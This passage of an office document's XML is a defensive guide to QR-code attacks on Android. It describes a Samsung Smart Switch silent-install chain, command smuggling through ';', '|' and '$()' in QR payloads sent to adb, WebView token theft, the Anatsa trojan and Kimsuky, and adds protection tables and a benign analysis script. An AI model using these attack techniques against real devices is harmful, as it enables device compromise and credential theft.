      <text:p text:style-name="P1">Attacker Phone ──QR Code──► Target Phone (Samsung)<text:line-break/> <text:s text:c="34"/>│<text:line-break/> <text:s text:c="34"/>▼<text:line-break/> <text:s text:c="24"/>Gaming Hub opens (no user prompt)<text:line-break/> <text:s text:c="34"/>│<text:line-break/> <text:s text:c="34"/>▼<text:line-break/> <text:s text:c="24"/>Smart Switch Agent Triggered<text:line-break/> <text:s text:c="34"/>│<text:line-break/> <text:s text:c="34"/>▼<text:line-break/> <text:s text:c="19"/>Downloads Malicious APK via Content Provider<text:line-break/> <text:s text:c="34"/>│<text:line-break/> <text:s text:c="34"/>▼<text:line-break/> <text:s text:c="24"/>Automatic Installation (No Consent)<text:line-break/> <text:s text:c="34"/>│<text:line-break/> <text:s text:c="34"/>▼<text:line-break/> <text:s text:c="24"/>Complete Device Compromise</text:p>
      <text:p text:style-name="Text_20_body">**The URIs used were not validated, allowing the attacker to force the phone to download any APK.</text:p>
      <text:h text:style-name="Heading_20_3" text:outline-level="3"><text:soft-page-break/>3. Shell Injection via QR Code URLs</text:h>
      <text:p text:style-name="Text_20_body">A critical vulnerability in QR scanning tools occurs when QR payloads are passed unsanitized to <text:span text:style-name="T2">adb shell am start</text:span> commands.</text:p>
      <text:p text:style-name="Text_20_body">A malicious QR containing characters like <text:span text:style-name="T2">;</text:span>, <text:span text:style-name="T2">|</text:span>, or <text:span text:style-name="T2">$()</text:span> could cause arbitrary command execution on the connected device.</text:p>
      <text:h text:style-name="Heading_20_3" text:outline-level="3">4. Exported WebView Activity Exploits</text:h>
      <text:p text:style-name="Text_20_body">When an Android app has an exported <text:span text:style-name="T2">WebViewActivity</text:span> (common in QR scanners), any app—or any QR code—can launch it with custom parameters.</text:p>
      <text:p text:style-name="Text_20_body">Attackers can pass a malicious URL that gets loaded in the WebView, and if access tokens are appended to the URL, they can be stolen.</text:p>
      <text:h text:style-name="Heading_20_3" text:outline-level="3">5. Imou Life App Vulnerabilities</text:h>
      <text:p text:style-name="Text_20_body"><text:span text:style-name="T1">CVE-2023-6913:</text:span> The QR code functionality doesn't properly filter codes, allowing attackers to hijack user accounts.</text:p>
      <text:p text:style-name="Text_20_body"><text:span text:style-name="T1">CVE-2023-42470:</text:span> Remote Code Execution via crafted intents to exported components.</text:p>
      <text:h text:style-name="Heading_20_2" text:outline-level="2">🦠 The Anatsa Banking Trojan (Active Threat)</text:h>
      <text:p text:style-name="Text_20_body">Anatsa is a sophisticated banking trojan distributed specifically through fake QR code reader apps on the Google Play Store.</text:p>
      <text:p text:style-name="P1">1. User downloads "QR Code Reader" from Play Store<text:line-break/>2. App behaves normally initially<text:line-break/>3. App secretly downloads encrypted payload<text:line-break/>4. Payload uses Android Accessibility Services<text:line-break/>5. Trojan overlays fake banking login screens<text:line-break/>6. Attacker steals credentials in real-time</text:p>
      <text:p text:style-name="Text_20_body">It has infected over 70,000 devices.</text:p>
      <text:h text:style-name="Heading_20_2" text:outline-level="2">🎭 The Kimsuky Campaign (State-Sponsored)</text:h>
      <text:p text:style-name="Text_20_body">North Korean threat actors used QR codes to bridge desktop and mobile devices.</text:p>
      <text:p text:style-name="Text_20_body">When targets accessed phishing URLs from a desktop, the page displayed a QR code to scan with their phone, directing them to install fake delivery tracking apps that were actually the <text:span text:style-name="T1">DocSwap RAT</text:span>.</text:p>
      <text:h text:style-name="Heading_20_2" text:outline-level="2"><text:soft-page-break/>🛡️ COMPLETE PROTECTION STRATEGY</text:h>
      <text:h text:style-name="Heading_20_3" text:outline-level="3">For Individual Users</text:h>
      <table:table table:name="Table7" table:style-name="Table7">
        <table:table-column table:style-name="Table7.A" table:number-columns-repeated="2"/>
        <table:table-header-rows>
          <table:table-row>
            <table:table-cell table:style-name="Table7.A1" office:value-type="string">
              <text:p text:style-name="Table_20_Heading"><text:span text:style-name="T1">Threat</text:span></text:p>
            </table:table-cell>
            <table:table-cell table:style-name="Table7.B1" office:value-type="string">
              <text:p text:style-name="Table_20_Heading"><text:span text:style-name="T1">Protection</text:span></text:p>
            </table:table-cell>
          </table:table-row>
        </table:table-header-rows>
        <table:table-row>
          <table:table-cell table:style-name="Table7.A2" office:value-type="string">
            <text:p text:style-name="Table_20_Contents"><text:span text:style-name="T1">QR-in-QR</text:span></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table7.B2" office:value-type="string">
            <text:p text:style-name="P5">Use QR scanners that show the decoded URL before opening</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Table7.A2" office:value-type="string">
            <text:p text:style-name="Table_20_Contents"><text:span text:style-name="T1">Janus Exploit</text:span></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table7.B2" office:value-type="string">
            <text:p text:style-name="P5">Keep Android updated (Android 8.0+ patched)</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Table7.A2" office:value-type="string">
            <text:p text:style-name="Table_20_Contents"><text:span text:style-name="T1">Anatsa Trojan</text:span></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table7.B2" office:value-type="string">
            <text:p text:style-name="P5">Only download QR scanners from trusted developers, check permissions</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Table7.A2" office:value-type="string">
            <text:p text:style-name="Table_20_Contents"><text:span text:style-name="T1">Exported WebViews</text:span></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table7.B2" office:value-type="string">
            <text:p text:style-name="P5">Be suspicious if a QR code opens a WebView asking for credentials</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Table7.A2" office:value-type="string">
            <text:p text:style-name="Table_20_Contents"><text:span text:style-name="T1">Smart Chain Exploits</text:span></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table7.B2" office:value-type="string">
            <text:p text:style-name="P5">Update Samsung devices regularly</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Table7.A2" office:value-type="string">
            <text:p text:style-name="Table_20_Contents"><text:span text:style-name="T1">Kimsuky Campaign</text:span></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table7.B2" office:value-type="string">
            <text:p text:style-name="P5">Verify sender identity before scanning delivery QR codes</text:p>
          </table:table-cell>
        </table:table-row>
      </table:table>
      <text:p text:style-name="Text_20_body"/>
      <text:h text:style-name="Heading_20_3" text:outline-level="3">For Organizations</text:h>
      <text:list text:style-name="L12">
        <text:list-item>
          <text:p text:style-name="P17"><text:span text:style-name="T1">Block QR codes in email</text:span> or render them non-functional</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P17"><text:span text:style-name="T1">Deploy MDM</text:span> with QR scanning restrictions</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P17"><text:span text:style-name="T1">Use secure QR scanners</text:span> that validate URLs and check against blocklists</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P17"><text:span text:style-name="T1">User education:</text:span> "If a QR code asks you to enter a delivery number after scanning, it's phishing"</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P17"><text:span text:style-name="T1">Enforce MFA</text:span> on all corporate accounts</text:p>
        </text:list-item>
      </text:list>
      <text:h text:style-name="Heading_20_3" text:outline-level="3" text:is-list-header="true">Emergency Response</text:h>
      <text:p text:style-name="Text_20_body">If you suspect a QR compromise:</text:p>
      <text:p text:style-name="P1"># On Android (if USB debugging enabled)<text:line-break/>adb shell dumpsys package<text:line-break/>adb shell dumpsys activity services<text:line-break/>adb logcat | grep -i "webview\|qrcode\|download"<text:line-break/><text:line-break/># Check for suspicious Accessibility Services<text:line-break/>Settings → Accessibility → Installed Services<text:line-break/># Disable ANY service you don't recognize immediately</text:p>
      <text:h text:style-name="Heading_20_2" text:outline-level="2">🔬 Hands-On Lab: Safe QR Analysis</text:h>
      <text:p text:style-name="P1">#!/bin/bash<text:line-break/># qr_safe_analyzer.sh<text:line-break/># Extract and analyze QR codes without trusting them<text:line-break/><text:line-break/>QR_FILE="$1"<text:line-break/><text:soft-page-break/><text:line-break/># Extract URL without opening<text:line-break/>URL=$(zbarimg -q --raw "$QR_FILE")<text:line-break/><text:line-break/># Check if it's a URL<text:line-break/>if [[ "$URL" =~ ^https?:// ]]; then<text:line-break/> <text:s text:c="3"/>DOMAIN=$(echo "$URL" | awk -F/ '{print $3}')<text:line-break/> <text:s text:c="3"/><text:line-break/> <text:s text:c="3"/># Check domain age<text:line-break/> <text:s text:c="3"/>whois "$DOMAIN" | grep "Creation Date"<text:line-break/> <text:s text:c="3"/><text:line-break/> <text:s text:c="3"/># Check with VirusTotal API<text:line-break/> <text:s text:c="3"/>curl -s "https://www.virustotal.com/api/v3/domains/$DOMAIN" \<text:line-break/> <text:s text:c="8"/>-H "x-apikey: YOUR_API_KEY"<text:line-break/>fi<text:line-break/><text:line-break/># Check for nested QR codes (requires image processing)<text:line-break/>python3 -c "<text:line-break/>from PIL import Image<text:line-break/>import qrcode<text:line-break/>img = Image.open('$QR_FILE')<text:line-break/># Check for multiple QR finder patterns<text:line-break/># (Simplified - real detection requires more logic)<text:line-break/>print('Manual inspection recommended for nested QR codes')<text:line-break/>"</text:p>
      <text:h text:style-name="Heading_20_2" text:outline-level="2">📋 Summary Table: QR Attack Vectors vs Android Exploits</text:h>
      <table:table table:name="Table8" table:style-name="Table8">
        <table:table-column table:style-name="Table8.A" table:number-columns-repeated="4"/>
        <table:table-header-rows>
          <table:table-row>
            <table:table-cell table:style-name="Table8.A1" office:value-type="string">
              <text:p text:style-name="Table_20_Heading"><text:span text:style-name="T1">Attack Vector</text:span></text:p>
            </table:table-cell>
            <table:table-cell table:style-name="Table8.A1" office:value-type="string">
              <text:p text:style-name="Table_20_Heading"><text:span text:style-name="T1">Android Vulnerability</text:span></text:p>
            </table:table-cell>
            <table:table-cell table:style-name="Table8.A1" office:value-type="string">
              <text:p text:style-name="Table_20_Heading"><text:span text:style-name="T1">Real-World Example</text:span></text:p>
            </table:table-cell>
            <table:table-cell table:style-name="Table8.D1" office:value-type="string">
              <text:p text:style-name="Table_20_Heading"><text:span text:style-name="T1">Protection</text:span></text:p>
            </table:table-cell>
          </table:table-row>
        </table:table-header-rows>
        <table:table-row>
          <table:table-cell table:style-name="Table8.A2" office:value-type="string">
            <text:p text:style-name="P5">Nested QR Codes</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table8.A2" office:value-type="string">
            <text:p text:style-name="P5">Scanner ambiguity</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table8.A2" office:value-type="string">
            <text:p text:style-name="P5">Tycoon PhaaS</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table8.D2" office:value-type="string">
            <text:p text:style-name="P5">Manual URL inspection</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Table8.A2" office:value-type="string">
            <text:p text:style-name="P5">QR to APK Download</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table8.A2" office:value-type="string">
            <text:p text:style-name="P5">Janus (CVE-2017-13156)</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table8.A2" office:value-type="string">
            <text:p text:style-name="P5">Fake Telegram APKs</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table8.D2" office:value-type="string">
            <text:p text:style-name="P5">Android 8.0+</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Table8.A2" office:value-type="string">
            <text:p text:style-name="P5">QR to WebView</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table8.A2" office:value-type="string">
            <text:p text:style-name="P5">Exported WebView Activity</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table8.A2" office:value-type="string">
            <text:p text:style-name="P5">CVE-2023-42470</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table8.D2" office:value-type="string">
            <text:p text:style-name="P5">App updates</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Table8.A2" office:value-type="string">
            <text:p text:style-name="P5">QR in Email</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table8.A2" office:value-type="string">
            <text:p text:style-name="P5">User leaving security perimeter</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table8.A2" office:value-type="string">
            <text:p text:style-name="P5">Anatsa Trojan</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table8.D2" office:value-type="string">
            <text:p text:style-name="P5">Block QR in email</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Table8.A2" office:value-type="string">
            <text:p text:style-name="P5">QR to Accessibility</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table8.A2" office:value-type="string">
            <text:p text:style-name="P5">Accessibility Service abuse</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table8.A2" office:value-type="string">
            <text:p text:style-name="P5">Anatsa overlay attacks</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table8.D2" office:value-type="string">
            <text:p text:style-name="P5">Monitor Accessibility settings</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Table8.A2" office:value-type="string">
            <text:p text:style-name="P5">QR to ADB Command</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table8.A2" office:value-type="string">
            <text:p text:style-name="P5">Shell injection (CVE pending)</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table8.A2" office:value-type="string">
            <text:p text:style-name="Table_20_Contents"><text:span text:style-name="T2">adb shell am start</text:span></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table8.D2" office:value-type="string">
            <text:p text:style-name="P5">Disable USB debugging</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Table8.A2" office:value-type="string">
            <text:p text:style-name="P5">QR to Smart Switch</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table8.A2" office:value-type="string">
            <text:p text:style-name="P5">Samsung validation bypass</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table8.A2" office:value-type="string">
            <text:p text:style-name="P5">Smart Switch exploit chain</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table8.D2" office:value-type="string">
            <text:p text:style-name="P5">Samsung security updates</text:p>
          </table:table-cell>
        </table:table-row>
      </table:table>
      <text:p text:style-name="Text_20_body"/>
      <text:h text:style-name="Heading_20_2" text:outline-level="2">⚠️ FINAL WARNING</text:h>
      <text:p text:style-name="Text_20_body"><text:span text:style-name="T1">The nested QR code technique is particularly dangerous</text:span> because it actively exploits the trust users have in legitimate-looking codes while attacking the limitations of automated security scanners.</text:p>
      <text:p text:style-name="Text_20_body"><text:soft-page-break/><text:span text:style-name="T1">Always inspect the decoded URL before opening it.</text:span> A secure QR scanner should show you the destination and ask for confirmation. If your QR scanner doesn't do this, replace it.</text:p>
      <text:p text:style-name="Text_20_body"><text:span text:style-name="T1">Remember:</text:span> The goal of this knowledge is defense. Understanding how these attacks work is the first step to building resilient security practices for yourself and your organization.</text:p>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6-11T10:06:21.022258878</dc:date>
    <meta:editing-duration>PT19H8M7S</meta:editing-duration>
    <meta:editing-cycles>2</meta:editing-cycles>
    <meta:generator>LibreOffice/26.2.2.2$Linux_X86_64 LibreOffice_project/620$Build-2</meta:generator>
    <meta:document-statistic meta:table-count="8" meta:image-count="0" meta:object-count="0" meta:page-count="110" meta:paragraph-count="4052" meta:word-count="28020" meta:character-count="235504" meta:non-whitespace-character-count="184848"/>
  </office:meta>
</office:document-meta>
</file>